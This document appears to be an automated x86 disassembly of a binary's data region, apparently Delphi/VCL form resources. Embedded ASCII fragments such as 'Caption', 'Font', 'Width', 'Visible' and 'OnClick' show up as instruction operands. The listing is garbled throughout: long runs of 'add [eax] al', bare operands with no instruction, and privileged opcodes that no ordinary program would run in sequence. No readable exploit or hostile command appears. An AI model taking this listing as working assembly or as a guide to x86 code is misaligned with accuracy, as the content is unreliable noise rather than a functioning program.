test al 0xc9
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
test [ ebx + 0x2200044 ] bl
add bh bh
and al 0x8b
inc esi
add [ ebp + edi * 2 + 0x46 ] ah
add [ eax - 0x80000000 ] al
push cs
add [ 0x69746341 ] cl
jbe r-xdata
add [ edi ] cl
inc ecx
insb
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
mov [ eax + eax + 0x61 ] al
add [ eax ] al
dec [ eax + 0x240044c9 ]
0x44
outsd
insb
rol [ eax + 0x5b0044 ] 0x1
add bh bh
dec eax

je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
outsd
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
clc
insb
jl r-xdata
add [ eax ] eax
add [ ebp + edi * 2 + 0x46 ] ah
add [ eax + 0x7 ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
lodsb [ esi ]
jpe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
[ esp + ebx * 2 + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add [ eax + 0x6e ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
push [ eax ]
inc esp
add [ ecx + eax ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
popad
outsb
jae r-xdata
add al 0x20
inc edx
add [ eax ] dh
call 0x75453b02
scasd [ edi ]
inc esi
imul ebp [ edi + 0x6e ] r-xdata
jl r-xdata
jb r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x4f00ffff ] ah
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
outsb
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
jb r-xdata
inc esp
add [ eax ] ch
jno r-xdata
inc esi
popad
jo r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
xor al 0xd6
inc esp
add [ esi + edx * 8 + 0x44 ] ah
add [ ebp + edi * 2 + 0x46 ] ah
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
inc esi
add [ ecx ] ch
add al [ eax ]
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x54 ] 0x9b004487
xor al [ esi ]
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
movsb [ edi ] [ esi ]
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
jo r-xdata
jo r-xdata
add [ eax + 0x6e ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax ] bh
rol [ eax + eax - 0x8 ] 0x1
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9065646f
xor [ esi ] eax
sub [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
clc
sub [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push esp
xchg [ eax + eax - 0x65 ] eax
jb r-xdata
add al [ eax ]
jmp [ eax - 0x51 ]
and [ edx ] al
in al dx
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add bh bh
aam 0xd7
inc esp
add al dh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
aas
inc ebp
add [ eax + 0x453f ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
jmp [ eax ]
xchg [ eax + eax + 0x5d ] al
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
lodsb [ esi ]
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
sub_463c5f
push eax
test [ eax + eax ] 0x0
add [ eax + 0x1 ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x4010ac74
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
outsb
je r-xdata
dec ecx
imul ebp [ ebp - 0x50 ] 0x8004622
add al [ eax ]
[ eax - 0x5bffb9a4 ]
push esp
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
and al 0x42
add [ eax ] ch
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
add al 0x46
xor [ esi ] al
das
add al [ eax ]
call esp
jge r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
add [ ebp + edi * 2 + 0x46 ] ah
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
adc [ eax ] al
dec esp
add [ eax ] al
call [ esi + ecx * 8 ]
inc esp
add [ eax + 0x6e ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
sub al 0x42
add [ eax + 0x2 ] al
add bh bh
cwde
jge r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
jmp [ ebp + edi * 2 + 0x46 ]
add [ ebp + edi * 2 + 0x46 ] ch
add [ eax - 0x80000000 ] al
sub eax [ eax ]
add al 0x49
insb
push esp
jge r-xdata
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
add al dh
add [ esi ] 0x4
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
add [ 0x35ff0002 ] dh
jb r-xdata
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
add al [ eax ]
jmp [ ebp + edi * 2 + 0x46 ]
outsb
cwde
xor al [ esi ]
xor eax 0x35ff0002
outsb
arpl [ eax - 0x34 ] bp
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ebp + edi * 2 + 0x46 ] ah
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ eax + 0x6f ] edx
add [ eax ] al
add [ eax + eax ] dh
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
insb
jae r-xdata
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
add [ eax ] al
dec edi
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
jb r-xdata
inc eax
add [ ecx + eax * 4 + 0x46 ] dl
add [ eax - 0x7f ] ah
inc esi
add [ ebp + edi * 2 + 0x46 ] ah
add [ eax + 0x1 ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
add [ esi ] 0x0
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
bound ebp [ edx + 0x65 ]
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
add [ esi ] cl
dec edi
rol [ ebp ] 0x60
add al [ eax ]
call eax
jle r-xdata
je r-xdata
outsb
xor [ esi ] eax
xor [ edx ] al
add bh bh
cmp [ ecx + 0x7da40046 ] al
inc esi
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
adc [ eax ] al
[ esi ] 0x4
push esp
add [ ebp + edi * 2 + 0x46 ] ah
add [ eax - 0x80000000 ] al
das
pop eax
jno r-xdata
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
push eax
int 0x44
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ eax ] al
inc eax
add [ eax ] al
jmp [ ebp + edi * 2 + 0x46 ]
je r-xdata
add bh bh
movsb [ edi ] [ esi ]
jge r-xdata
sub eax [ edx ]
add bh bh
push eax
add [ esi ] 0xa4
jge r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add bh bh
movsb [ edi ] [ esi ]
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
outsb
and al [ esi ]
or al 0x2
add bh bh
mov eax 0xa400465c
jge r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
dec edi
outsb
inc ebx
sbb al al
inc ebp
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add al [ eax ]
call [ eax - 0x5b00fffe ]
jge r-xdata
inc ebx
insb
outsd
jae r-xdata
xchg esp eax
mov es [ eax + eax - 0x40 ]
add [ eax + 0x6e ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
movsb [ edi ] [ esi ]
jge r-xdata
jb r-xdata
push ecx
nop
push ebp
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add al [ eax ]
jmp [ ebp + edi * 2 + 0x46 ]
push ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
outsb
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
insb
xor eax [ esi ]
cwde
add al [ eax ]
[ eax - 0x5b00fffe ]
jge r-xdata
add [ eax + 0x2 ] bl
add bh bh
hlt
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
nop
outsb
inc ebx
outsd
outsb
jae r-xdata
add al 0x8f
inc esp
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
movsb [ edi ] [ esi ]
jb r-xdata
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
nop
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0042 ] al
add [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
[ eax + 0x71 ]
inc esi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edx ] cl
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edi + ecx * 2 ] cl
popad
je r-xdata
jmp [ ebp + edi * 2 + 0x46 ]
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
push esp
jb r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
jmp [ ebp + edi * 2 + 0x46 ]
push eax
outsd
jb r-xdata
jo r-xdata
dec edi
outsb
inc esp
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
pop eax
mov [ eax + eax - 0x50 ] es
add [ eax ] eax
push [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
push ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
nop
jbe r-xdata
jns r-xdata
mov al [ 0xffffffffa4ff0002 ]
jo r-xdata
jbe r-xdata
mov eax [ eax + eax + 0x8 ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
jge r-xdata
mov [ eax + eax - 0x48 ] es
add [ eax ] eax
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x8 ] bp
mov es [ eax + eax - 0x30 ]
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
jo r-xdata
push ebp
inc ecx
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
push ebp
inc ecx
add al dl
add al [ eax ]
call eax
dec ebp
add [ esi ] al
dec edi
outsb
dec eax
imul esp [ ebp - 0x14 ] 0xa8004633
add al [ eax ]
[ eax + 0x1ff0002 ]
add bh bh
movsb [ edi ] [ esi ]
jge r-xdata
imul esi [ ebp + 0x49 ] 0x906f666e
push ebp
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
jmp [ ebp + edi * 2 + 0x46 ]
outsb
outsw
nop
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
mov eax [ eax + eax - 0x18 ]
add [ eax ] al
movsb [ edi ] [ esi ]
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
or [ eax ] 0xa
dec edi
mov al [ eax + eax - 0x10 ]
add [ eax ] al
push eax
add [ eax ] al
jmp [ ebp + edi * 2 + 0x46 ]
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070051 ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0055 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0053 ] al
outsb
dec ebp
outsd
jne r-xdata
loopne r-xdata
jo r-xdata
mov [ eax + eax - 0x28 ] eax
add [ eax ] al
nop
mov al [ eax + eax - 0x20 ]
add [ eax ] eax
jmp eax
add [ edi ] al
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
push edi
push 0x1c6c6565
nop
inc esp
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add bh bh
movsb [ edi ] [ esi ]
jge r-xdata
dec ebp
outsd
jne r-xdata
mov [ eax + eax - 0x30 ] eax
jae r-xdata
push edi
mov al 0x33
inc esi
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
sbb al 0x90
inc esp
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
push 0xe0004489
add [ eax ] al
jmp eax
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
outsd
jne r-xdata
push ebp
jo r-xdata
je r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
nop
push ebp
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
jmp [ ebp + edi * 2 + 0x46 ]
push edi
push 0x556c6565
jo r-xdata
add [ eax ] al
call eax
add [ eax ] al
jmp [ ebp + edi * 2 + 0x46 ]
pop [ eax + eax + 0x38 ]
add [ eax ] eax
sub al 0x46
inc esi
add [ esi + eax * 2 + 0x46 ] ah
add al bh
add al [ eax ]
add [ eax + 0x34 ] cl
inc esi
add [ eax ] bh
adc [ edx ] eax
mov al [ 0x54004664 ]
inc si
add [ eax - 0x3fffbfcd ] bh
mov al [ esi ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
mov esp 0x34004666
dec ecx
outsd
arpl [ ebx + 0x50 ] bp
lea eax [ eax + eax - 0x10 ]
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
sar [ eax ] 0x45
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x46 ] bh
popad
jb r-xdata
imul eax [ esi ] sub_44d41c
push eax
adc [ edx ] eax
cmp al 0x72
inc esi
add [ eax ] dh
push cs
inc edx
add ah bl
lodsd [ esi ]
inc esi
add [ edi + ebp * 4 + 0x44480046 ] dh
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
and [ ecx + 0x68b80046 ] dh
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 2 ] ch
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebp
add [ edi + ecx * 2 ] cl
push ebp
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
jmp [ ebp + edi * 2 + 0x46 ]
mov [ esi ] eax
add [ eax + 0x13540046 ] cl
inc ebp
add [ eax + 0x13 ] bl
inc ebp
add [ edx + ecx * 4 + 0x46 ] bh
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x40044d5 ] dl
jb r-xdata
inc ebp
add [ esp + ebp * 2 ] ch
inc esi
add [ eax - 0x75 ] dh
inc ecx
add [ eax ] ah
mov cl 0x46
add [ eax - 0x3bffb998 ] bh
add [ ecx + ecx * 2 ] dh
inc esp
outsd
jb r-xdata
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax - 0x6f ] dh
inc esi
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi - 0x597bffbb ] ch
inc esi
add [ eax ] dl
pop ebx
inc esi
add al al
pop ebp
inc esi
add [ edi + edx * 4 + 0x46 ] ah
add [ eax + 0x1c004667 ] ah
adc [ ebp ] eax
xor [ esi ] bh
inc ebp
add al dl
jo r-xdata
add [ eax ] al
add [ eax ] dl
inc edi
inc esi
add [ eax + eax ] cl
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi + 0x33b00040 ] ah
js r-xdata
inc ebp
add al cl
salc
inc esp
add [ edx + esi * 2 + 0x46 ] bh
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ ecx ] bl
inc esi
add [ eax ] ah
jns r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
push eax
inc esi
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
push 0xaa640046
inc esi
add al bl
inc esi
add [ eax - 0x5b ] ch
inc esi
add [ eax - 0x74 ] cl
inc esi
add [ edi ] bl
inc esi
add [ eax ] al
jb r-xdata
add [ edx + edx - 0x7a1bffbb ] bh
inc esi
add [ ecx + ecx * 4 + 0x46 ] al
add [ eax ] al
mov [ esi ] al
push esp
adc eax [ ebp ]
pop eax
adc eax [ ebp ]
jl r-xdata
or al [ edx ]
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
nop
inc eax
dec eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48 ] dh
inc esi
add [ eax + ecx * 2 + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosb [ edi ]
dec eax
inc esi
add [ eax + 0x1 ] al
add [ eax ] al
push eax
imul eax [ ecx ] sub_421138
xor [ eax ] eax
xor [ fs : eax ] eax
outsb
arpl [ eax - 0x70 ] bp
adc [ edi + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] ch
add [ eax - 0x4bffbfcd ] dh
xor eax [ eax ]
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
inc esp
add ah al
inc ebp
add [ edi + ebp * 2 ] bl
inc esi
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0x10
jo r-xdata
mov al 0x48
inc ebp
add [ eax - 0x37 ] bh
add [ eax + 0x30004511 ] bh
inc esi
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ebx + esi + 0x310c0040 ] ch
dec eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x40004648 ] ch
add [ eax ] eax
add [ eax + 0x69 ] dl
inc ecx
add [ eax ] bh
adc [ edx ] eax
inc esi
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax ] bl
push cs
inc edx
add ah ah
or al 0x42
add [ eax ] ch
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ ebp + eax * 8 + 0xe0046 ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
cmp al 0x0
add [ eax ] al
pop esp
movsb [ edi ] [ esi ]
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] ch
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
cmp [ ebp + 0x46 ] al
add [ eax ] ch
aaa
inc esi
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cli
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
mov esp 0x7004648
or al 0x54
inc ecx
jo r-xdata
push esp
adc [ eax ] al
[ esi ] 0x4
add [ esi ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69500d00
js r-xdata
add [ eax + edx + 0x40 ] dl
add al dh
add [ esi ] 0x4
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
inc eax
dec eax
inc esi
add [ edx + ebp * 2 + 0x41 ] cl
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffb9b9 ] bl
inc edi
inc esi
